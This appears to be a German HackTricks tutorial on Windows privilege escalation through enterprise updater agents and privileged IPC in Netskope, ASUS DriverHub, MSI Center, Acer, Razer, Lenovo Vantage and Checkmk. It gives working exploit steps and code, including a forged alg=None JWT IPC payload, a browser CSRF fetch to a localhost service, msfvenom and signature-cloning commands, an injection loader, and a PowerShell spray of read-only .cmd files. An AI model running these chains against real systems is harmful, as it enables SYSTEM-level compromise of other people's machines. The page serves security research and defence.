# Missbrauch von Enterprise Auto-Updatern und privilegiertem IPC (z. B. Netskope, ASUS und MSI)

{{#include ../../banners/hacktricks-training.md}}

Diese Seite verallgemeinert eine Klasse lokaler Windows-Privilege-Escalation-Ketten, die in Enterprise-Endpunkt-Agenten und Updatern gefunden wurden. Diese stellen eine leicht zugängliche IPC-Schnittstelle und einen privilegierten Update-Ablauf bereit. Ein repräsentatives Beispiel ist Netskope Client für Windows < R129 (CVE-2025-0309): Ein Benutzer mit niedrigen Berechtigungen kann die Registrierung auf einen vom Angreifer kontrollierten Server umleiten und anschließend ein bösartiges MSI zustellen, das der SYSTEM-Dienst installiert.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Wichtige Ideen, die sich auf ähnliche Produkte übertragen lassen:
- Das localhost-IPC eines privilegierten Dienstes missbrauchen, um eine erneute Registrierung oder Neukonfiguration auf einem Angreifer-Server zu erzwingen.
- Die Update-Endpunkte des Anbieters implementieren, ein gefälschtes Trusted Root CA ausliefern und den Updater auf ein bösartiges, „signiertes“ Paket verweisen.
- Schwache Signaturprüfungen (CN-Allow-Lists), optionale Digest-Flags und lasche MSI-Eigenschaften umgehen.
- Wenn IPC „verschlüsselt“ ist, den Schlüssel/die IV aus weltweit lesbaren Maschinenkennungen in der Registry ableiten.
- Wenn der Dienst Aufrufer anhand des Image-Pfads/Prozessnamens einschränkt, in einen zugelassenen Prozess injizieren oder einen solchen angehalten starten und die DLL über eine minimale Thread-Context-Änderung laden.

Benutzerdefinierte lokale TCP-Dienste sollten derselben Prüfung von Identität und Eingabegrenzen unterzogen werden, selbst wenn sie eine PIN oder andere Anwendungsanmeldedaten erfordern. Ordne den Listener seinem Prozess und dem effektiven Dienstkonto zu und prüfe dann die genaue bereitgestellte Binärdatei/Version sowie, ob vom Aufrufer kontrollierte Felder längengeprüft werden, bevor sie in feste Puffer kopiert oder zum Erstellen eines Child-Process-Befehls verwendet werden. [Microsofts Hinweise zu Buffer Overruns](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) erläutern, warum ungeprüfte externe Eingaben in privilegiertem nativen Code gefährlich sind. Ein Loopback-Listener, fest codierte Anmeldedaten oder ein Prozessname allein belegen weder Memory Corruption noch SYSTEM-Ausführung; Erreichbarkeit, Autorisierung, Codepfad und Mitigations bleiben separate Bedingungen. Beschränke die routinemäßige Enumeration auf passive Methoden, statt Eingaben mit Absturzlänge an einen aktiven Dienst zu senden.

---
## 1) Registrierung über localhost-IPC auf einen Angreifer-Server umleiten

Viele Agenten enthalten einen User-Mode-UI-Prozess, der über localhost TCP und JSON mit einem SYSTEM-Dienst kommuniziert.

Bei Netskope beobachtet:
- UI: stAgentUI (low integrity) ↔ Dienst: stAgentSvc (SYSTEM)
- IPC-Befehls-ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit-Ablauf:
1) Ein JWT-Registrierungstoken erstellen, dessen Claims den Backend-Host steuern (z. B. AddonUrl). `alg=None` verwenden, sodass keine Signatur erforderlich ist.
2) Die IPC-Nachricht mit dem Provisioning-Befehl, deinem JWT und dem Mandantennamen senden:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Der Dienst beginnt, Anfragen für Enrollment/Config an deinen rogue server zu senden, z. B.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Hinweise:
- Wenn die Caller Verification pfad- oder namensbasiert ist, muss die Anfrage von einem allow-listed Vendor-Binary stammen (siehe §4).<sup>[[1]](#references)[[2]](#references)</sup>

### Netzwerkexponiertes Management-IPC

Diese Vertrauensgrenze ist nicht immer auf localhost beschränkt. Im gemeldeten Fall von MyReport Updater 2.1.1 lauschte ein `LocalSystem`-Dienst auf allen Interfaces und akzeptierte eine nicht authentifizierte gRPC-Änderung der Konfiguration für Referenzhost, Port und Betriebsmodus. Für die Remote-Variante waren sowohl Netzwerkzugriff auf den Listener als auch ausgehender Zugriff des Dienstes auf die gewählte Referenz erforderlich. Bewerte diese Faktoren getrennt davon, ob der spätere Paketablauf die Grenze für Dateischreibzugriffe überschreiten kann.<sup>[[16]](#references)</sup>

---
## 2) Den Update-Kanal hijacken, um Code als SYSTEM auszuführen

Sobald der Client mit deinem Server kommuniziert, implementiere die erwarteten Endpoints und leite ihn zu einem Angreifer-MSI. Typischer Ablauf:

1) /v2/config/org/clientconfig → Gib eine JSON-Konfiguration mit einem sehr kurzen Updater-Intervall zurück, z. B.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Gibt ein PEM-CA-Zertifikat zurück. Der Dienst installiert es im Trusted-Root-Speicher des lokalen Computers.
3) /v2/checkupdate → Stellt Metadaten bereit, die auf eine bösartige MSI und eine gefälschte Version verweisen.

Umgehung gängiger Prüfungen in freier Wildbahn:
- Allow-List für Signer-CNs: Der Dienst prüft möglicherweise nur, ob der Subject-CN „netSkope Inc“ oder „Netskope, Inc.“ lautet. Deine rogue CA kann ein Leaf-Zertifikat mit diesem CN ausstellen und die MSI signieren.
- Eigenschaft CERT_DIGEST: Füge eine harmlose MSI-Eigenschaft namens CERT_DIGEST hinzu. Bei der Installation wird sie nicht geprüft.
- Optionale Digest-Prüfung: Ein Konfigurationsflag (z. B. check_msi_digest=false) deaktiviert zusätzliche kryptografische Validierung.

Ergebnis: Der SYSTEM-Dienst installiert deine MSI aus
C:\ProgramData\Netskope\stAgent\data\*.msi
und führt beliebigen Code als NT AUTHORITY\SYSTEM aus.<sup>[[1]](#references)[[2]](#references)</sup>

Lehre aus Patch-Umgehungen: Wenn ein Anbieter als Reaktion eine kleine Auswahl „vertrauenswürdiger“ Domains auf eine Allow-List setzt, statt die Update-Quelle kryptografisch zu authentifizieren, solltest du nach anbietereigenen Redirectors oder Reverse Proxies suchen, über die sich der Datenverkehr weiterhin steuern lässt. Im Fall von Netskope zeigte eine öffentliche Nachfolgeanalyse, dass sich eine Allow-List aus der R129-Ära weiterhin über `rproxy.goskope.com` ausnutzen ließ, das von Angreifern kontrollierte Inhalte eines Azure App Service weiterleitete. Betrachte Hostname-Allow-Lists als Hürde, nicht als Vertrauensgrenze.<sup>[[14]](#references)</sup>

Ein weiterer Fehlerfall sind **in sich konsistente, aber nicht authentifizierte Paketmetadaten**. Im MyReport-Fall lieferte eine vom Angreifer kontrollierte Referenz ein modifiziertes Archiv, während ein Intermediär die MD5-Digest- und Größenangaben des Anbieters änderte, bevor sie den Updater erreichten. Der Abgleich dieser Werte prüfte die Konsistenz der Antworten, nicht deren Herkunft vom Anbieter; eine MD5-Kollision war nicht erforderlich. Ein vom Aufrufer ausgewähltes Installationsverzeichnis machte die privilegierte Extraktion dann zu einer Dateischreibgrenze. Die daraus entstehende DLL-Loading-Primitive wird unter [chaining an arbitrary file write into DLL hijacking](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack) behandelt.<sup>[[16]](#references)</sup>

---
## 3) Verschlüsselte IPC-Anfragen fälschen (falls vorhanden)

Ab R127 verpackte Netskope IPC-JSON in einem encryptData-Feld, das wie Base64 aussieht. Eine Analyse zeigte AES, wobei Schlüssel und IV aus Registry-Werten abgeleitet wurden, die für jeden Benutzer lesbar sind:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Angreifer können die Verschlüsselung nachbilden und gültige verschlüsselte Befehle von einem Standardbenutzer aus senden.<sup>[[1]](#references)[[2]](#references)</sup> Allgemeiner Tipp: Wenn ein Agent seine IPC plötzlich „verschlüsselt“, solltest du nach Geräte-IDs, Product-GUIDs und Installations-IDs unter HKLM suchen, die als Schlüsselmaterial dienen.

---
## 4) IPC-Allow-Lists für Aufrufer umgehen (Pfad-/Namensprüfungen)

Manche Dienste versuchen, den Peer zu authentifizieren, indem sie die PID der TCP-Verbindung ermitteln und den Image-Pfad bzw. -Namen mit einer Allow-List von Anbieter-Binärdateien unter Program Files vergleichen (z. B. stagentui.exe, bwansvc.exe, epdlp.exe).

Zwei praktische Umgehungsmöglichkeiten:
- DLL injection in einen auf der Allow-List stehenden Prozess (z. B. nsdiag.exe) und IPC-Weiterleitung von diesem Prozess aus.
- Eine auf der Allow-List stehende Binärdatei als angehaltenen Prozess starten und deine Proxy-DLL ohne CreateRemoteThread laden (siehe §5), um die vom Treiber erzwungenen Tamper-Regeln einzuhalten.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Mit Tamper Protection kompatible Injection: angehaltener Prozess + NtContinue-Patch

Produkte liefern häufig einen Minifilter-/OB-Callbacks-Treiber (z. B. Stadrv) mit, der gefährliche Rechte aus Handles zu geschützten Prozessen entfernt:
- Prozess: entfernt PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: beschränkt auf THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Ein zuverlässiger User-Mode-Loader, der diese Einschränkungen berücksichtigt:
1) Erstelle mit CreateProcess eine Anbieter-Binärdatei und verwende CREATE_SUSPENDED.
2) Beschaffe die weiterhin zulässigen Handles: PROCESS_VM_WRITE | PROCESS_VM_OPERATION für den Prozess und ein Thread-Handle mit THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (oder nur THREAD_RESUME, wenn du den Code an einem bekannten RIP patchst).
3) Überschreibe ntdll!NtContinue (oder einen anderen frühzeitig und garantiert gemappten Thunk) mit einem kurzen Stub, der LoadLibraryW mit dem Pfad deiner DLL aufruft und dann zurückspringt.
4) Rufe ResumeThread auf, um den Stub im Prozess auszuführen und deine DLL zu laden.

Da du PROCESS_CREATE_THREAD oder PROCESS_SUSPEND_RESUME nie für einen bereits geschützten Prozess verwendet hast (du hast ihn selbst erstellt), wird die Richtlinie des Treibers eingehalten.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Praktische Tools
- NachoVPN (Netskope-Plugin) automatisiert das Erstellen einer rogue CA, das Signieren einer bösartigen MSI und die Bereitstellung der erforderlichen Endpunkte: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope ist ein benutzerdefinierter IPC-Client, der beliebige (optional AES-verschlüsselte) IPC-Nachrichten erstellt und die Injection in angehaltene Prozesse enthält, um Nachrichten von einer auf der Allow-List stehenden Binärdatei auszusenden.<sup>[[4]](#references)</sup>

## 7) Schneller Triage-Workflow für unbekannte Updater-/IPC-Angriffsflächen

Wenn du auf einen neuen Endpoint-Agenten oder eine „Helper“-Suite für Motherboards stößt, reicht ein schneller Workflow normalerweise aus, um festzustellen, ob du ein vielversprechendes Privesc-Ziel vor dir hast:<sup>[[6]](#references)</sup>

1) Liste Loopback-Listener auf und ordne sie den Prozessen des Anbieters zu:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Kandidaten für Named Pipes auflisten:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Registry-gestützte Routingdaten von pluginbasierten IPC-Servern auslesen:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Extrahiere zuerst Endpoint-Namen, JSON-Schlüssel und Command-IDs aus dem User-Mode-Client. Gepackte Electron/.NET-Frontends leaken häufig das vollständige Schema:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Suche nach dem tatsächlichen Vertrauensprädikat, nicht nur nach dem Codepfad, der schließlich den Prozess startet:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Muster, die priorisiert werden sollten:
- `CryptQueryObject`/certificate parsing ohne `WinVerifyTrust` deutet meist darauf hin, dass „Zertifikat existiert“ als „Zertifikat ist vertrauenswürdig“ behandelt wurde. Das ermöglicht das Klonen von Zertifikaten oder andere Tricks mit gefälschten Signaturen.
- Teilstring-/Suffix-Prüfungen von `Origin`, `Referer`, Download-URLs, Prozessnamen oder Signer-CNs sind keine Authentifizierung. `contains(".vendor.com")` ist meist mit vom Angreifer kontrollierten Lookalike-Domains ausnutzbar.
- Wenn die GUI mit niedrigen Berechtigungen entscheidet, „die Datei ist vertrauenswürdig“, und der SYSTEM-broker dieses Ergebnis lediglich übernimmt, lässt sich die Grenze oft vollständig umgehen, indem man die clientseitige DLL/JS patcht oder neu implementiert (Razer-ähnliche geteilte Validierung).
- Wenn der broker ein Payload nach `%TEMP%`/`C:\Windows\Temp` kopiert und es anschließend von diesem Pfad aus validiert oder einplant, teste sofort auf TOCTOU-Austauschfenster und auf benachbarte Plugin-Module, die alternative `ExecuteTask()`-Wrapper mit schwächeren Prüfungen bereitstellen.<sup>[[6]](#references)</sup>

Bei Zielen mit vielen Named Pipes ist PipeViewer eine schnelle Möglichkeit, schwache DACLs und aus der Ferne erreichbare Pipes zu finden, bevor du mit dem detaillierten Reverse Engineering des Protokolls beginnst.<sup>[[11]](#references)</sup>

Wenn das Ziel Aufrufer nur anhand der PID, des Image-Pfads oder des Prozessnamens authentifiziert, solltest du das eher als Hürde denn als Sicherheitsgrenze betrachten: Eine Injection in den legitimen Client oder eine Verbindung über einen zugelassenen Prozess reicht oft aus, um die Serverprüfungen zu bestehen. Für Named Pipes behandelt [diese Seite zu Client-Impersonation und Pipe-Abuse](named-pipe-client-impersonation.md) die Primitive ausführlicher.

Bei einem privilegierten **Cleanup- oder Restore-Broker** solltest du neben der Pipe-ACL auch die Vertrauensgrenze der Pfade prüfen. Ein Aufrufer mit niedrigeren Berechtigungen kann möglicherweise ein Restore-Ziel auswählen oder ein bereitgestelltes Backup-Artefakt in einem gemeinsam genutzten Verzeichnis umbenennen, selbst wenn die Service-Executable und ihr Installationsverzeichnis geschützt sind. Prüfe separat, ob der Aufrufer den Restore-Befehl ausführen kann, die exakte bereitgestellte Eingabe oder den Dateinamen ändern kann, der Broker mit einer höheren Identität läuft und der Restore-Vorgang tatsächlich in den ausgewählten geschützten Pfad schreibt. Ein beschreibbares Bereitstellungsverzeichnis oder eine lesbare Pipe allein belegt keinen beliebigen privilegierten Schreibzugriff; die Zielzuordnung und das Verhalten des Dienstes müssen durch Code-Review oder kontrollierte Tests geprüft werden. Führe bei passiver Enumeration keine unbekannten Cleanup-Befehle aus, da sie Benutzerdateien löschen könnten.

---
## 8) Modulare Add-in-Broker, die nur anhand von Hersteller-Signaturen authentifiziert werden (Lenovo-Vantage-Muster)

Eine neuere Variante, nach der es sich zu suchen lohnt, ist der **RPC-Broker mit signiertem Client**: Ein Lenovo-signierter Desktop-Prozess mit niedrigen Berechtigungen kommuniziert mit einem SYSTEM-Dienst, und der Dienst leitet JSON-Befehle an eine Reihe XML-beschriebener Add-ins unter `%ProgramData%` weiter. Sobald Codeausführung **innerhalb eines beliebigen akzeptierten signierten Clients** erreicht ist, wird jeder Vertrag mit `runas="system"` Teil deiner Angriffsfläche.<sup>[[15]](#references)</sup>

Wertvolle Primitive aus der Lenovo-Vantage-Forschung:
- **Dem Aufrufer vertrauen, weil er vom Hersteller signiert ist**: Forschende erreichten einen authentifizierten Kontext, indem sie eine Lenovo-signierte EXE in ein beschreibbares Verzeichnis kopierten und einen DLL-Side-Load (`profapi.dll`) auslösten, sodass beliebiger Code innerhalb eines Clients ausgeführt wurde, dem der Dienst bereits vertraute.
- **Manifestgesteuerte Erkundung der Angriffsfläche**: Add-ins werden unter `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` deklariert; mehrere Verträge laufen als `SYSTEM`. Daher enthüllt die Enumeration dieser Manifeste oft schneller als das Reverse Engineering des Brokers selbst die tatsächlich privilegierten Verben.
- **Fehler einzelner Befehle hinter dem authentifizierten Kanal**: Nachdem sie in den vertrauenswürdigen Client gelangt waren, fanden öffentliche Untersuchungen Path Traversal plus Race Conditions in Update-/Installationsverben, Missbrauch von Raw SQL in privilegierten Einstellungsdatenbanken und Teilstring-basierte Prüfungen von Registry-Pfaden, die Schreibzugriffe außerhalb des vorgesehenen Hives ermöglichten.

Nützliche Erkundung auf einem Ziel:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Praktische Erkenntnis: Wenn eine Helper-Suite einen Broker bereitstellt, der zuerst den **aufrufenden Prozess** authentifiziert und erst dann Dutzende Plugin-/Add-in-Befehle ausführt, sollte man nicht nach dem Umgehen der Vertrauensprüfung an der Eingangstür aufhören. Dump die Manifest-/Vertragstabelle und fuzze jede privilegierte Aktion unabhängig; der authentifizierte Kanal verbirgt oft mehrere Fehler in einer zweiten Stufe.

---
## 1) CSRF vom Browser zu localhost gegen privilegierte HTTP-APIs (ASUS DriverHub)

DriverHub installiert einen HTTP-Dienst im User-Mode (ADU.exe) auf 127.0.0.1:53000, der Browseraufrufe von https://driverhub.asus.com erwartet. Der Origin-Filter führt einfach `string_contains(".asus.com")` für den Origin-Header und die unter `/asus/v1.0/*` bereitgestellten Download-URLs aus. Daher besteht jeder vom Angreifer kontrollierte Host wie `https://driverhub.asus.com.attacker.tld` die Prüfung und kann JavaScript verwenden, um zustandsverändernde Anfragen zu senden.<sup>[[6]](#references)</sup> Weitere Umgehungsmuster findest du unter [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md).

Praktischer Ablauf:
1) Registriere eine Domain, die `.asus.com` enthält, und hoste dort eine bösartige Webseite.
2) Verwende `fetch` oder XHR, um einen privilegierten Endpunkt (z. B. `Reboot`, `UpdateApp`) auf `http://127.0.0.1:53000` aufzurufen.
3) Sende den vom Handler erwarteten JSON-Body – das gepackte Frontend-JS zeigt das folgende Schema.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Selbst die unten gezeigte PowerShell-CLI ist erfolgreich, wenn der Origin-Header auf den vertrauenswürdigen Wert gespooft wird:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Jeder Browseraufruf der Angreifer-Website wird somit zu einem lokalen CSRF mit einem Klick (oder mit `onload` ohne Klick), der einen SYSTEM-Hilfsprozess steuert.

---
## 2) Unsichere Code-Signaturprüfung und Zertifikatklonen (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` lädt beliebige, im JSON-Body definierte ausführbare Dateien herunter und speichert sie im Cache unter `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Die Validierung der Download-URL verwendet dieselbe Teilzeichenfolgenlogik, daher wird `http://updates.asus.com.attacker.tld:8000/payload.exe` akzeptiert. Nach dem Download prüft ADU.exe lediglich, ob die PE-Datei eine Signatur enthält und der Subject-String mit ASUS übereinstimmt, bevor die Datei ausgeführt wird – ohne `WinVerifyTrust` und ohne Kettenvalidierung.

So lässt sich der Ablauf für einen Angriff ausnutzen:
1) Payload erstellen (z. B. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) ASUS-Signatur auf die Payload klonen (z. B. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) `pwn.exe` auf einer `.asus.com`-ähnlichen Domain hosten und UpdateApp über den obigen browserbasierten CSRF auslösen.

Da sowohl die Origin- als auch die URL-Filter auf Teilzeichenfolgen basieren und die Signaturprüfung lediglich Strings vergleicht, lädt DriverHub die Angreifer-Binärdatei herunter und führt sie mit erhöhten Rechten aus.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU in Updater-Kopier- und Ausführungspfaden (MSI Center CMD_AutoUpdateSDK)

Der SYSTEM-Dienst von MSI Center stellt ein TCP-Protokoll bereit, bei dem jedes Frame dem Format `4-byte ComponentID || 8-byte CommandID || ASCII arguments` folgt. Die Kernkomponente (Component ID `0f 27 00 00`) enthält `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Der Handler:
1) Kopiert die angegebene ausführbare Datei nach `C:\Windows\Temp\MSI Center SDK.exe`.
2) Prüft die Signatur über `CS_CommonAPI.EX_CA::Verify` (der Certificate Subject muss „MICRO-STAR INTERNATIONAL CO., LTD.“ entsprechen und `WinVerifyTrust` erfolgreich sein).
3) Erstellt eine geplante Aufgabe, die die temporäre Datei mit vom Angreifer kontrollierten Argumenten als SYSTEM ausführt.

Die kopierte Datei wird zwischen der Prüfung und `ExecuteTask()` nicht gesperrt. Ein Angreifer kann:
- Frame A mit einer legitimen, von MSI signierten Binärdatei senden (dadurch besteht die Signaturprüfung und die Aufgabe wird eingereiht).
- Mit wiederholten Frame-B-Nachrichten, die auf eine schädliche Payload verweisen, einen Race auslösen und `MSI Center SDK.exe` unmittelbar nach Abschluss der Prüfung überschreiben.

Wenn die Aufgabenplanung die Aufgabe ausführt, startet sie die überschriebene Payload als SYSTEM, obwohl die ursprüngliche Datei geprüft wurde. Für eine zuverlässige Ausnutzung werden zwei Goroutines/Threads verwendet, die `CMD_AutoUpdateSDK` so lange wiederholt senden, bis das Zeitfenster für den TOCTOU-Race gewonnen ist.<sup>[[6]](#references)</sup>

---
## 2) Missbrauch benutzerdefinierter SYSTEM-IPC und Impersonation (MSI Center + Acer Control Centre)

### MSI-Center-TCP-Befehlssätze
- Jedes von `MSI.CentralServer.exe` geladene Plugin/DLL erhält eine Component ID, die unter `HKLM\SOFTWARE\MSI\MSI_CentralServer` gespeichert ist. Die ersten 4 Bytes eines Frames wählen diese Komponente aus, sodass Angreifer Befehle an beliebige Module weiterleiten können.
- Plugins können eigene Aufgabenstarter definieren. `Support\API_Support.dll` stellt `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` bereit und ruft `API_Support.EX_Task::ExecuteTask()` direkt **ohne Signaturprüfung** auf – jeder lokale Benutzer kann den Befehl auf `C:\Users\<user>\Desktop\payload.exe` richten und so zuverlässig SYSTEM-Codeausführung erreichen.
- Das Mitschneiden von Loopback-Datenverkehr mit Wireshark oder die Instrumentierung der .NET-Binärdateien in dnSpy zeigt schnell die Zuordnung von Component zu Befehl. Anschließend können benutzerdefinierte Go-/Python-Clients Frames wiedergeben.<sup>[[6]](#references)</sup>

### Named Pipes von Acer Control Centre und Impersonation-Levels
- `ACCSvc.exe` (SYSTEM) stellt `\\.\pipe\treadstone_service_LightMode` bereit; die zugehörige Discretionary ACL erlaubt Remote-Clients den Zugriff (z. B. über `\\TARGET\pipe\treadstone_service_LightMode`). Das Senden der Befehls-ID `7` mit einem Dateipfad ruft die Prozessstart-Routine des Dienstes auf.
- Die Client-Bibliothek serialisiert zusammen mit den Argumenten ein spezielles Terminator-Byte (113). Die dynamische Instrumentierung mit Frida/`TsDotNetLib` (siehe [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) für Hinweise zur Instrumentierung) zeigt, dass der native Handler diesen Wert vor dem Aufruf von `CreateProcessAsUser` einem `SECURITY_IMPERSONATION_LEVEL` und einer Integrity-SID zuordnet.
- Wird 113 (`0x71`) durch 114 (`0x72`) ersetzt, landet die Ausführung im generischen Zweig, der das vollständige SYSTEM-Token beibehält und eine High-Integrity-SID (`S-1-16-12288`) setzt. Die gestartete Binärdatei läuft daher uneingeschränkt als SYSTEM, sowohl lokal als auch rechnerübergreifend.
- In Kombination mit dem offengelegten Installer-Flag (`Setup.exe -nocheck`) lässt sich ACC auch auf Labor-VMs installieren und die Pipe ohne Hersteller-Hardware testen.<sup>[[6]](#references)</sup>

Diese IPC-Schwachstellen zeigen, warum Localhost-Dienste gegenseitige Authentifizierung erzwingen müssen (ALPC-SIDs, `ImpersonationLevel=Impersonation`-Filter, Token-Filterung) und warum die Funktion „beliebige Binärdatei ausführen“ jedes Moduls dieselben Signaturprüfungen verwenden muss.

---
## 3) COM/IPC-„Elevator“-Hilfsprozesse mit schwacher Validierung im User-Mode (Razer Synapse 4)

Razer Synapse 4 brachte ein weiteres nützliches Muster dieser Art mit: Ein Benutzer mit niedrigen Rechten kann einen COM-Hilfsprozess auffordern, über `RzUtility.Elevator` einen Prozess zu starten. Die Vertrauensentscheidung wird dabei an eine User-Mode-DLL (`simple_service.dll`) delegiert, statt zuverlässig innerhalb der privilegierten Grenze durchgesetzt zu werden.

Beobachteter Ausnutzungspfad:
- Das COM-Objekt `RzUtility.Elevator` instanziieren.
- `LaunchProcessNoWait(<path>, "", 1)` aufrufen, um einen Start mit erhöhten Rechten anzufordern.
- Im öffentlichen PoC wird die PE-Signaturprüfung in `simple_service.dll` vor dem Senden der Anfrage deaktiviert, sodass eine beliebige, vom Angreifer ausgewählte ausführbare Datei gestartet werden kann.<sup>[[6]](#references)[[10]](#references)</sup>

Minimale PowerShell-Aufrufsyntax:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Allgemeine Erkenntnis: Wenn Sie „Helper“-Suites reverse-engineeren, sollten Sie sich nicht auf localhost-TCP oder named pipes beschränken. Prüfen Sie auf COM-Klassen mit Namen wie `Elevator`, `Launcher`, `Updater` oder `Utility` und verifizieren Sie anschließend, ob der privilegierte Dienst die Ziel-Binärdatei tatsächlich selbst überprüft oder lediglich einem Ergebnis vertraut, das von einer patchbaren User-Mode-Client-DLL berechnet wurde. Dieses Muster gibt es nicht nur bei Razer: Jedes geteilte Design, bei dem der Broker mit hohen Privilegien eine Allow/Deny-Entscheidung der Seite mit niedrigen Privilegien übernimmt, ist eine mögliche Privesc-Angriffsfläche.


---
## Vorhersehbare Ausführung temporärer Skripte während einer MSI-Reparatur (Checkmk Agent / CVE-2024-0670)

Einige Windows-Agents führen privilegierte Aktionen weiterhin aus, indem sie eine temporäre `.cmd`-Datei in `C:\Windows\Temp` schreiben und sie als `SYSTEM` ausführen. Ist der Dateiname vorhersehbar und erstellt der Dienst vorhandene Dateien nicht sicher neu, kann ein Benutzer mit niedrigen Privilegien die künftige temporäre Datei vorab als **read-only** anlegen. Dadurch führt der privilegierte Prozess vom Angreifer kontrollierte Inhalte statt seines eigenen Skripts aus.

Beobachtet in anfälligen Checkmk-Agent-Builds:
- temp-Muster: `cmk_all_<PID>_1.cmd`
- betroffene Branches: `2.0.0`, `2.1.0`, `2.2.0`
- Auslöser: MSI-**Reparatur** des zwischengespeicherten Agent-Pakets<sup>[[8]](#references)[[9]](#references)</sup>

Praktischer Ablauf:
1. Schätzen Sie einen realistischen PID-Bereich anhand aktueller Prozess-IDs oder der PID des laufenden Agents.
2. Schreiben Sie ein kurzes **ASCII**-`.cmd`-Payload (`Set-Content -Encoding Ascii` oder Umleitung über `cmd.exe`; vermeiden Sie UTF-16-Ausgaben von PowerShell für Batch-Dateien).
3. Sprühen Sie `C:\Windows\Temp\cmk_all_<PID>_1.cmd` über den möglichen Bereich und markieren Sie jede Datei als read-only.
4. Lösen Sie eine Reparatur des zwischengespeicherten MSI aus, damit der privilegierte Dienst versucht, das temporäre Skript neu zu erstellen und es anschließend ausführt.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Wenn das verwundbare Produkt mit Windows Installer installiert wurde, ermittle den Produktnamen der zufällig benannten, zwischengespeicherten MSI-Datei unter `C:\Windows\Installer`, bevor du die Reparatur auslöst:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Betriebshinweise:
- `qwinsta` ist hilfreich, wenn `msiexec /fa` in einer nicht-interaktiven WinRM-Shell fehlschlägt und Sie herausfinden müssen, ob eine bestehende Desktop-/getrennte Sitzung die Reparatur korrekt auslösen kann.<sup>[[7]](#references)</sup>
